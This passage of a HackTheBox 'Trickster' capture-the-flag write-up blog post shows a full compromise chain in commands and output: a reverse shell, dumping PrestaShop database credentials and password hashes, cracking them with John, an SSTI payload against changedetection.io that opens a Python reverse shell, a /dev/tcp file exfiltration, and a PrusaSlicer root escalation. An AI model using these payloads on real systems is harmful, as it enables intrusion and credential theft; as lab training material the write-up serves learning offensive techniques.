http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: <span class="number">403</span></span><br><span class="line">Ncat: Connection from <span class="number">10.129</span>.<span class="number">46.156</span>:<span class="number">33956</span>.</span><br><span class="line">id</span><br><span class="line">Linux trickster <span class="number">5.15</span>.<span class="number">0</span><span class="literal">-121-generic</span> <span class="comment">#131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> <span class="number">08</span>:<span class="number">36</span>:<span class="number">24</span> up <span class="number">58</span> min,  <span class="number">0</span> users,  load average: <span class="number">0.11</span>, <span class="number">0.16</span>, <span class="number">0.16</span></span><br><span class="line">USER     TTY      FROM             LOGIN<span class="selector-tag">@</span>   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=<span class="number">33</span>(www<span class="literal">-data</span>) gid=<span class="number">33</span>(www<span class="literal">-data</span>) groups=<span class="number">33</span>(www<span class="literal">-data</span>)</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in!</p>
+<p>As usual, the first thing to do is to look for database credentials:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> parameters.php</span><br><span class="line">&lt;?php <span class="built_in">return</span> array (</span><br><span class="line">  <span class="string">&#x27;parameters&#x27;</span> =&gt;</span><br><span class="line">  array (</span><br><span class="line">    <span class="string">&#x27;database_host&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;prestashop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_user&#x27;</span> =&gt; <span class="string">&#x27;ps_user&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_password&#x27;</span> =&gt; <span class="string">&#x27;prest@shop_o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_prefix&#x27;</span> =&gt; <span class="string">&#x27;ps_&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_engine&#x27;</span> =&gt; <span class="string">&#x27;InnoDB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mailer_transport&#x27;</span> =&gt; <span class="string">&#x27;smtp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mailer_host&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mailer_user&#x27;</span> =&gt; NULL,</span><br><span class="line">    <span class="string">&#x27;mailer_password&#x27;</span> =&gt; NULL,</span><br><span class="line">    <span class="string">&#x27;secret&#x27;</span> =&gt; <span class="string">&#x27;eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ps_caching&#x27;</span> =&gt; <span class="string">&#x27;CacheMemcache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ps_cache_enable&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;ps_creation_date&#x27;</span> =&gt; <span class="string">&#x27;2024-05-25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;locale&#x27;</span> =&gt; <span class="string">&#x27;en-US&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;use_debug_toolbar&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;cookie_key&#x27;</span> =&gt; <span class="string">&#x27;8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cookie_iv&#x27;</span> =&gt; <span class="string">&#x27;fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;new_cookie_key&#x27;</span> =&gt; <span class="string">&#x27;def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03f4040bd5e8cb44bdb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47&#x27;</span>,</span><br><span class="line">    &lt;snip&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Now let’s try to get something from the database:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">www-data@trickster:/$  mysql -u ps_user -pprest@shop_o</span><br><span class="line"> mysql -u ps_user -pprest@shop_o</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 1649</span><br><span class="line">Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| prestashop         |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use prestashop;</span><br><span class="line">use prestashop;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [prestashop]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| Tables_in_prestashop                            |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">&lt;snip&gt;                       |</span><br><span class="line">| ps_employee                                     |</span><br><span class="line">| ps_employee_session                             |</span><br><span class="line">| ps_employee_shop                                |</span><br><span class="line">&lt;snip&gt;                       |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">276 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [prestashop]&gt; <span class="keyword">select</span> * from ps_employee;</span><br><span class="line"><span class="keyword">select</span> * from ps_employee;</span><br><span class="line">+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+</span><br><span class="line">| id_employee | id_profile | id_lang | lastname | firstname | email               | passwd                                                       | last_passwd_gen     | stats_date_from | stats_date_to | stats_compare_from | stats_compare_to | stats_compare_option | preselect_date_range | bo_color | bo_theme | bo_css    | default_tab | bo_width | bo_menu | active | optin | id_last_order | id_last_customer_message | id_last_customer | last_connection_date | reset_password_token | reset_password_validity | has_enabled_gravatar |</span><br><span class="line">+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+</span><br><span class="line">|           1 |          1 |       1 | Store    | Trickster | admin@trickster.htb | $2y$10<span class="variable">$P8wO3jruKKpvKRgWP6o7o</span>.rojbDoABG9StPUt0dR7LIeK26RdlB/C | 2024-05-25 13:10:20 | 2024-04-25      | 2024-05-25    | 0000-00-00         | 0000-00-00       |                    1 | NULL                 | NULL     | default  | theme.css |           1 |        0 |       1 |      1 |  NULL |             5 |                        0 |                0 | 2025-02-01           | NULL                 | 0000-00-00 00:00:00     |                    0 |</span><br><span class="line">|           2 |          2 |       0 | james    | james     | james@trickster.htb | $2a$04<span class="variable">$rgBYAsSHUVK3RZKfwbYY9OPJyBbt</span>/OzGw9UHi4UnlK6yG5LyunCmm | 2024-09-09 13:22:42 | NULL            | NULL          | NULL               | NULL             |                    1 | NULL                 | NULL     | NULL     | NULL      |           0 |        0 |       1 |      0 |  NULL |             0 |                        0 |                0 | NULL                 | NULL                 | NULL                    |                    0 |</span><br><span class="line">+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [prestashop]&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>With a simple johntheripper command we can get our password:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/trickster]</span><br><span class="line">└─$ john  --wordlist=/home/kali/Desktop/rockyou.txt <span class="built_in">hash</span>                                                                                                                   130 ⨯</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 16 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">alwaysandforever (?)</span><br><span class="line">1g 0:00:00:02 DONE (2024-09-21 18:47) 0.3401g/s 12600p/s 12600c/s 12600C/s baloon..alex4ever</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed                                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/trickster]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s now get our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; ssh james@trickster.htb</span><br><span class="line">The authenticity of host <span class="string">&#x27;trickster.htb (10.129.46.156)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>trickster.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">james@trickster.htb&#x27;</span>s password:</span><br><span class="line">Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41</span><br><span class="line">james@trickster:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">a52e7e89c3d548******************</span><br><span class="line">james@trickster:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-ChangeDetection-SSTI"><a href="#Privilege-Escalation-ChangeDetection-SSTI" class="headerlink" title="Privilege Escalation - ChangeDetection SSTI"></a>Privilege Escalation - ChangeDetection SSTI</h3><p>First, I can use fscan which is a comprehensive intranet scanning tool to scan for open ports (since we found a docker interface on the machine):<br>Running <code>./fscan -h 172.17.0.1/24</code> we find that the actual IP is 172.17.0.2, now we scan for open ports:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">james@trickster:~$ ./fscan  -h 172.17.0.2 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 2.0.0</span></span><br><span class="line"><span class="string">[*] 扫描类型: all, 目标端口: 1-65535</span></span><br><span class="line"><span class="string">[*] 开始信息扫描...</span></span><br><span class="line"><span class="string">[*] 最终有效主机数量: 1</span></span><br><span class="line"><span class="string">[*] 共解析 65535 个有效端口</span></span><br><span class="line"><span class="string">[+] 端口开放 172.17.0.2:5000</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we got port 5000, so let’s forward that to our machine:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Trickster/changedetection.png"
+                      alt="ChangeDetection"
+                ><figcaption>ChangeDetection</figcaption></figure><br>We can simply use james’ password to login:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Trickster/changedetection1.png"
+                      alt="ChangeDetection"
+                ><figcaption>ChangeDetection</figcaption></figure><br>Changedetection tracks changes on websites and notifies users of updates. Certain versions are vulnerable to SSTI, like the one we have on our hands.<br>We can find <a class="link"   target="_blank" rel="noopener" href="https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/" >a good PoC here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Just launch a web server, create a new website as detailed below, and then insert your SSTI script in the notification body and <code>gets://10.10.x.x</code> in the notification URL:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Trickster/changedetection2.png"
+                      alt="ChangeDetection"
+                ><figcaption>ChangeDetection</figcaption></figure></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; self.__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.x.x&quot;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)\&#x27;&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>And we’re in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.x.x] from (UNKNOWN) [10.129.46.181] 53754</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Under <code>/datastore/Backups</code> we find a couple changedetection backups:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">changedetection-backup-20240830194841.zip</span><br><span class="line">changedetection-backup-20240830202524.zip</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/datastore/Backups</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s get them on our machine. We can do it by running <code> cat changedetection-backup-20240830194841.zip &gt; /dev/tcp/10.10.x.x/9002</code> on the victim machine and <code>nc -lvnp 9002 &gt; changedetection.zip</code> on our machine.</p>
+<p>Doing this first game me a corrupt file, so the way is to transfer the files first to james’ session and then to our machine.<br>We can find a couple of interesting files, one of which is a brotli compressed file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         8/31/2024  12:47 AM           2605 f04f0732f120c0cc84a993ad99decb2c.txt.br</span><br><span class="line">-a----         8/31/2024  12:47 AM             51 history.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>We can run the command <code>brotli -d filename.br</code> and we can get the password for <code>adam</code> user <code>adam_admin992</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adam@trickster:~$ <span class="built_in">id</span></span><br><span class="line">uid=1002(adam) gid=1002(adam) <span class="built_in">groups</span>=1002(adam)</span><br><span class="line">adam@trickster:~$</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Pivoting-to-root-prusaslicer-abuse"><a href="#Pivoting-to-root-prusaslicer-abuse" class="headerlink" title="Pivoting to root - prusaslicer abuse"></a>Pivoting to root - prusaslicer abuse</h4><p>Now checking what we can execute as root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adam@trickster:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> adam on trickster:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User adam may run the following commands on trickster:</span><br><span class="line">    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer</span><br></pre></td></tr></table></figure></div>
+
+<p>PrusaSlicer takes 3D models (STL, OBJ, AMF) and converts them into G-code instructions for FFF printers or PNG layers for mSLA 3D printers.</p>
+<p>We can find <a class="link"   target="_blank" rel="noopener" href="https://github.com/suce0155/prusaslicer_exploit" >this PrusaSlicer exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>We simply have to update our exploit.sh file and execute the evil.3mf file as root using prusaslicer:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">adam@trickster:~$ <span class="built_in">ls</span> -al /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash</span><br><span class="line">adam@trickster:~$ bash -p</span><br><span class="line">bash-5.1<span class="comment"># id</span></span><br><span class="line">uid=1002(adam) gid=1002(adam) euid=0(root) egid=0(root) <span class="built_in">groups</span>=0(root),1002(adam)</span><br><span class="line">bash-5.1<span class="comment"># cat /root/root.txt</span></span><br><span class="line">0c6be42265e6c2******************</span><br><span class="line">bash-5.1<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for Trickster, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Trickster</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-01-31 20:45:25</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-02-01 11:27:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/01/31/Hackthebox-Trickster/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/01/25/Hackthebox-Caption/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Caption</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Trickster</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-trickster-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;trickster.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-shop-trickster-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;shop.trickster.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-ChangeDetection-SSTI"><span class="nav-text">Privilege Escalation - ChangeDetection SSTI</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
